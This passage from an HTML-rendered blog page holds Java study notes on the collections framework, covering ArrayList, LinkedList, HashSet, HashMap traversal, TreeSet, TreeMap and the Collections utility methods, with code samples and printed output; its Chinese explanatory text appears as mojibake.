&#123;<br>   System.out.println(o);<br>&#125;<br>        <br><span class="hljs-comment">//javass</span><br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for å¾ªç¯</p><ul><li>xxx.for</li><li>å‰ææœ‰ç´¢å¼•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.out.println(list.get(i));<br>&#125;<br><span class="hljs-comment">//æœ‰ç´¢å¼•</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>ç”±æ•°ç»„å®ç°æ•°æ®å­˜å‚¨</li><li>Vector å’Œ ArrayList åŸºæœ¬ç›¸åŒï¼ŒVector çº¿ç¨‹å®‰å…¨ï¼ŒArrayList æ‰§è¡Œæ•ˆç‡é«˜</li></ul><p>ArrayList æ‰©å®¹æœºåˆ¶</p><ul><li>æœ‰ä¸€ä¸ª Object ç±»å‹çš„æ•°ç»„ elementDataï¼Œå­˜æ”¾å…ƒç´  transient Object [ ] elementData</li><li>æŒ‡å®šå¤§å°æ„é€ å™¨</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>å¯¹è±¡æ•°ç»„å­˜æ”¾å…ƒç´ ï¼Œprotected Object [ ]  elementData</li><li>æŒ‡å®šæ‰©å®¹ä¸ªæ•°        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>åŒå‘é“¾è¡¨ï¼Œæœ‰ä¸¤ä¸ªå±æ€§ first å’Œ last åˆ†åˆ«æŒ‡å‘é¦–èŠ‚ç‚¹å’Œå°¾èŠ‚ç‚¹</li><li>æ¯ä¸ªèŠ‚ç‚¹ï¼ˆNode å¯¹è±¡ï¼‰é‡Œé¢æœ‰ prev ã€nextã€itemä¸‰ä¸ªå±æ€§ï¼Œitem å­˜æ”¾å…ƒç´ ï¼Œprev æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œnext æŒ‡å‘åä¸€ä¸ªèŠ‚ç‚¹</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">   Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>       Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>       Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node temp=first;<br>       <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>           System.out.println(temp);<br>           temp=temp.next;<br>       &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;item=&quot;</span> + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Node&#123;item=java&#125;</span><br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>æ— åºï¼Œæ²¡æœ‰ç´¢å¼•ï¼Œä½†æ˜¯è¾“å‡ºé¡ºåºå›ºå®š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    hashSet.add(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.add(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.out.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>ä¸å…è®¸é‡å¤å…ƒç´ ï¼Œæœ€å¤šåŒ…å«ä¸€ä¸ª null</p></li><li><p>Set æ¥å£æ˜¯ Collection å­æ¥å£ï¼Œå¸¸ç”¨æ–¹æ³•å’Œ Collection ä¸€æ ·</p></li><li><p>Set æ¥å£éå†æ–¹å¼</p><ul><li>è¿­ä»£å™¨éå†</li><li>å¢å¼º for éå†</li><li>ä¸èƒ½ç”¨ç´¢å¼•æ¥è·å–ï¼Œæ— æ³•ä½¿ç”¨æ™®é€š for éå†</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>å®é™…ä¸Šæ˜¯ HashMap</p></li><li><p>æ— åºï¼Œå–å†³äº hash åï¼Œç¡®å®šç´¢å¼•ç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"> HashSet set=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;abc&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;def&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-string">&quot;java&quot;</span>));<br>    System.out.println(set.add(<span class="hljs-literal">null</span>));<br>    set.remove(<span class="hljs-string">&quot;def&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;set&quot;</span>+set);<br><span class="hljs-comment">//true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">false</span><br>truej<br>set[<span class="hljs-literal">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add è¿›è¡Œçš„æ“ä½œ</strong></p><ul><li>HashMap åº•å±‚æ˜¯ï¼ˆæ•°ç»„ + é“¾è¡¨ + çº¢é»‘æ ‘ï¼‰</li><li>æ·»åŠ ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå…ˆå¾—åˆ° hash å€¼ï¼Œç„¶åè½¬åŒ–ä¸ºç´¢å¼•å€¼</li><li>æ‰¾åˆ°å­˜å‚¨æ•°æ®è¡¨ table ï¼Œçœ‹è¿™ä¸ªç´¢å¼•ä½ç½®æ˜¯å¦å·²ç»å­˜æ”¾å…ƒç´ ï¼Œæ²¡æœ‰å°±ç›´æ¥åŠ å…¥ï¼Œæœ‰å°±è°ƒç”¨ equals æ¯”è¾ƒï¼Œç›¸åŒå°±æ”¾å¼ƒæ·»åŠ ï¼Œä¸åŒå°±æ·»åŠ åˆ°æœ€å</li><li>å¦‚æœä¸€æ¡é“¾è¡¨å…ƒç´ ä¸ªæ•°&gt;&#x3D;8,table &gt;&#x3D;64ï¼Œè¿›è¡Œæ ‘å</li><li>å¦‚æœé“¾è¡¨æ²¡è¾¾åˆ° 8 ï¼Œtable æ²¡åˆ° 64ï¼Œå…ˆè¿›è¡Œæ•°ç»„æ‰©å®¹</li><li>åŠ å…¥ HashMap ä¸­çš„å…ƒç´ ï¼Œæ˜¯å¦ç›¸åŒç”± HashCode å’Œ equals æ–¹æ³•å†³å®š</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>ä¸å…è®¸æ·»åŠ é‡å¤å…ƒç´ ï¼Œæ˜¯HashSetå­ç±»ï¼Œåº•å±‚æ˜¯ LinkedHashMap</li><li>éå†é¡ºåºå’Œæ·»åŠ é¡ºåºä¸€è‡´</li><li>å­˜æ”¾å…ƒç´ æ–¹å¼å’Œ HashSet ç›¸åŒï¼Œåœ¨æ­¤åŸºç¡€ä¸Šåˆç»´æŠ¤äº†ä¸€ä¸ªåŒå‘é“¾è¡¨</li></ul><h2 id="Map-æ¥å£"><a href="#Map-æ¥å£" class="headerlink" title="Map æ¥å£"></a>Map æ¥å£</h2><ul><li>ä¸ Collection å¹¶åˆ—å­˜åœ¨ã€‚ç”¨äºä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„æ•°æ®ï¼šKey - Value ï¼ˆåŒåˆ—é›†åˆï¼‰</li><li>key å’Œ value å¯ä»¥æ˜¯ä»»ä½•å¼•ç”¨æ•°æ®ç±»å‹ï¼Œä¼šå°è£…åˆ° HashMap$Node å¯¹è±¡ä¸­</li><li>key ä¸èƒ½é‡å¤ï¼Œkey ä¸€æ ·æ—¶ï¼Œæ–°çš„å€¼ä¼šæ›¿æ¢æ—§çš„ï¼Œvalueå¯ä»¥é‡å¤</li><li>key å¯ä»¥ä¸º null ï¼ˆåªèƒ½ä¸€ä¸ªï¼‰ï¼Œvalue å¯ä»¥ä¸º null (å¯ä»¥å¤šä¸ª)</li><li>key å’Œ value ä¸ºå•å‘ä¸€å¯¹ä¸€å…³ç³»ï¼Œé€šè¿‡æŒ‡å®š key å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ value</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">  Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>        <br>    System.out.println(hashMap);<br><span class="hljs-comment">//&#123;100=null, pass=word, user=bb&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Map hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    hashMap.put(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;pass&quot;</span>,<span class="hljs-string">&quot;word&quot;</span>);<br>    hashMap.put(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;me&quot;</span>);<br>    Integer integer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(integer,<span class="hljs-literal">null</span>);<br>    hashMap.remove(<span class="hljs-string">&quot;user&quot;</span>);<br>    System.out.println(hashMap.get(<span class="hljs-string">&quot;pass&quot;</span>));<br>    System.out.println(hashMap.size());<br>    System.out.println(hashMap.isEmpty());<br>    System.out.println(hashMap.containsKey(<span class="hljs-string">&quot;admin&quot;</span>));<br>    System.out.println(hashMap);<br><span class="hljs-comment">//word</span><br><span class="hljs-number">3</span><br><span class="hljs-literal">false</span><br><span class="hljs-literal">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-literal">null</span>, pass=word, admin=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-éå†"><a href="#HashMap-éå†" class="headerlink" title="HashMap éå†"></a>HashMap éå†</h2><ul><li><p>å–å‡ºæ‰€æœ‰çš„ Key ï¼Œé€šè¿‡ key è·å– value</p><ul><li><p>åŠ å¼º forå¾ªç¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set keyset=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è¿­ä»£å™¨éå†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Iterator iterator=set.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>Object keyset=iterator.next();<br>System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">Set</span> <span class="hljs-variable">keysset</span> <span class="hljs-operator">=</span>hashMap.keySet();<br> keysset.forEach(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>() &#123;<br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Object keyset)</span> &#123;<br>         System.out.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>å–å‡ºæ‰€æœ‰çš„ value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection values=hashMap.values();<br><span class="hljs-keyword">for</span>(Object value:values)&#123;<br>      System.out.println(value);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>é€šè¿‡ EntrySet æ¥è·å– K-V</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.Entry entry=(Map.Entry)keyset;<br>        System.out.println(entry.getKey()+<span class="hljs-string">&quot;-&quot;</span>+entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value å­˜æ”¾</p></li><li><p>keySet å’Œ values è¿”å›ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Set set=map.keySet();<br>System.out.println(set.getClass());<br>Collection values=map.values();<br>System.out.println(values.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>å­˜æ”¾é”®å€¼å¯¹ï¼šK-V</li><li>é”®å€¼ä¸èƒ½ä¸º null</li><li>ä½¿ç”¨æ–¹æ³•å’Œ HashMap å·®ä¸å¤šä¸€æ ·</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>ç»§æ‰¿è‡ª Hashtable ç±»</li><li>ç”¨æ³•å’Œ hashmap ä¸€æ ·ï¼Œé”®å€¼ä¸èƒ½ä¸º null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>å¦‚æœæ¯”è¾ƒç»“æœå™¨ä¸º 0 ï¼Œæ•°æ®ä¸ä¼šåŠ å…¥åˆ° TreeSet</p></li><li><p>åœ¨æ„é€ å™¨ä¸­ï¼Œå¯ä»¥ä¼ å…¥ä¸€ä¸ªæ¯”è¾ƒå™¨ï¼ŒæŒ‡å®šæ’åºè§„åˆ™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">TreeSet treeSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>       <span class="hljs-meta">@Override</span><br>       <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.add(<span class="hljs-string">&quot;abcd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abc&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;abd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;cbd&quot;</span>);<br>   treeSet.add(<span class="hljs-string">&quot;ebd&quot;</span>);<br>        <br>   System.out.println(treeSet);<br><span class="hljs-comment">//[ebd, cbd, abd, abcd, abc]        </span><br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ¯”è¾ƒå™¨ï¼ŒæŒ‡å®šæ’åºè§„åˆ™</li><li>å¦‚æœæ¯”è¾ƒå™¨è¿”å› 0 ï¼Œåˆ™ key ä¸ä¼šåŠ å…¥åˆ° TreeMapï¼Œå€¼ä¼šæ›¿æ¢</li></ul><h2 id="Collections-å·¥å…·ç±»"><a href="#Collections-å·¥å…·ç±»" class="headerlink" title="Collections å·¥å…·ç±»"></a>Collections å·¥å…·ç±»</h2><ul><li>æ˜¯ä¸€ä¸ªæ“ä½œ Setã€List å’Œ Mapç­‰é›†åˆçš„å·¥å…·ç±»ï¼Œæä¾›ä¸€ç³»åˆ—é™æ€æ–¹æ³•</li></ul><h3 id="æ’åºç›¸å…³"><a href="#æ’åºç›¸å…³" class="headerlink" title="æ’åºç›¸å…³"></a>æ’åºç›¸å…³</h3><ul><li>reverse ( List ):åè½¬ List å…ƒç´ çš„é¡ºåº</li><li>shuffle ( List ) : éšæœºæ‰“ä¹±</li><li>sort ( List ) : æŒ‰å‡åºæ’åº</li><li>sort (List,Comparator ) : åˆ¶å®šè§„åˆ™è¿›è¡Œæ’åº</li><li>swap ( Listï¼Œint iï¼Œint  j ) : å°† i å’Œ j å¤„å…ƒç´ è¿›è¡Œäº¤æ¢</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    arrayList.add(<span class="hljs-number">100</span>);<br>    arrayList.add(<span class="hljs-number">200</span>);<br>    arrayList.add(<span class="hljs-number">300</span>);<br>    arrayList.add(<span class="hljs-number">400</span>);<br>    arrayList.add(<span class="hljs-number">500</span>);<br>    arrayList.add(<span class="hljs-number">600</span>);<br>    arrayList.add(<span class="hljs-number">700</span>);<br>    arrayList.add(<span class="hljs-number">800</span>);<br>    arrayList.add(<span class="hljs-number">900</span>);<br>    System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):å¯¹ List å…ƒç´ è¿›è¡Œåè½¬</span><br>    Collections.reverse(arrayList);<br>    System.out.println(arrayList);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):å¯¹ List é›†åˆå…ƒç´ è¿›è¡Œéšæœºæ‰“ä¹±</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(arrayList);<br>          System.out.println(arrayList);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):æŒ‰å‡åºæ’åº</span><br>   Collections.sort(arrayList);<br>      System.out.println(arrayList);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):å°†æŒ‡å®š List é›†åˆçš„ i å¤„å…ƒç´ å’Œ j å¤„å…ƒç´ äº¤æ¢</span><br>   Collections.swap(arrayList,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>      System.out.println(arrayList);      <span class="hljs-comment">//[100, 200, 300, 600, 500, 400, 700, 800, 900]</span><br></code></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾å’Œæ›¿æ¢"><a href="#æŸ¥æ‰¾å’Œæ›¿æ¢" class="headerlink" title="æŸ¥æ‰¾å’Œæ›¿æ¢"></a>æŸ¥æ‰¾å’Œæ›¿æ¢</h3><ul><li><p>Object max &#x2F; minï¼ˆCollection &#x2F; Collectonï¼ŒComparatorï¼‰ï¼šæ ¹æ®é¡ºåº &#x2F; æŒ‡å®šè§„åˆ™è¿”å›æœ€å¤§ &#x2F; å°å…ƒç´ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Object max=Collections.max(arrayList);<br>System.out.println(max);<br></code></pre></td></tr></table></figure></li><li><p>int frequency ( collection,Object ) :è¿”å›æŒ‡å®šå…ƒç´ å‡ºç°ä¸ªæ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> frequency=Collections.frequency(arrayList,<span class="hljs-number">500</span>);<br>System.out.println(frequency);<br></code></pre></td></tr></table></figure></li><li><p>void copy ï¼ˆList destï¼ŒList srcï¼‰:å°† src å†…å®¹å¤åˆ¶åˆ° dest ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList new_arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(arrayList.size());<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arrayList.size(); i++) &#123;<br>      new_arrayList.add(<span class="hljs-number">0</span>);  <br>   &#125;<br>  Collections.copy(new_arrayList,arrayList);<br>  System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li><li><p>boolean replaceAllï¼ˆList listï¼ŒObject oldValï¼ŒObject newValï¼‰ï¼šä½¿ç”¨æ–°å€¼æ›¿æ¢æ‰€æœ‰æ—§å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Collections.replaceAll(new_arrayList,<span class="hljs-number">200</span>,<span class="hljs-number">1000</span>);<br>System.out.println(new_arrayList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="é›†åˆçš„ä½¿ç”¨å’Œé€‰æ‹©"><a href="#é›†åˆçš„ä½¿ç”¨å’Œé€‰æ‹©" class="headerlink" title="é›†åˆçš„ä½¿ç”¨å’Œé€‰æ‹©"></a>é›†åˆçš„ä½¿ç”¨å’Œé€‰æ‹©</h3><p><strong>åˆ¤æ–­éœ€è¦å­˜å‚¨æ•°æ®ç±»æƒ³</strong></p><ul><li>ä¸€ç»„å¯¹è±¡</li><li>ä¸€ç»„é”®å€¼å¯¹</li></ul><p><strong>ä¸€ç»„å¯¹è±¡ï¼ˆå•åˆ—ï¼‰ï¼šCollection æ¥å£</strong></p><ul><li><p>å…è®¸é‡å¤ï¼šList</p><ul><li>å¢åˆ å¤šï¼šLinkedList ï¼ˆåº•å±‚æ˜¯åŒå‘é“¾è¡¨ï¼‰</li><li>æ”¹æŸ¥å¤šï¼šArrayListï¼ˆåº•å±‚æ˜¯ Object ç±»å‹çš„å¯å˜æ•°ç»„ï¼‰</li></ul></li><li><p>ä¸å…è®¸é‡å¤ï¼šSet</p><ul><li>æ— åºï¼šHashSetï¼ˆåº•å±‚æ˜¯ HashMapï¼Œæ•°ç»„ + é“¾è¡¨ +çº¢é»‘æ ‘ï¼‰</li><li>æ’åºï¼šTreeSet</li><li>æ’å…¥å’Œå–å‡ºé¡ºåºä¸€è‡´ï¼šLinkedHashSetï¼ˆåº•å±‚æ˜¯æ•°ç»„ + åŒå‘é“¾è¡¨ï¼‰</li></ul></li></ul><p><strong>ä¸€ç»„é”®å€¼å¯¹ï¼ˆåŒåˆ—ï¼‰ï¼šMap æ¥å£</strong></p><ul><li>é”®æ— åºï¼šHashMapï¼ˆ æ•°ç»„ + é“¾è¡¨ + çº¢é»‘æ ‘ ï¼‰</li><li>é”®æ’åºï¼šTreeMap</li><li>é”®æ’å…¥å’Œå–å‡ºé¡ºåºä¸€è‡´ï¼šLinkedHashMap</li><li>è¯»å–æ–‡ä»¶ï¼šProperties</li></ul><h1 id="æ³›å‹"><a href="#æ³›å‹" class="headerlink" title="æ³›å‹"></a>æ³›å‹</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><ul><li><p>public class ArrayList&lt;E&gt;</p><p>â€¦â€¦â€¦</p><p>&lt;E&gt;çš„ E 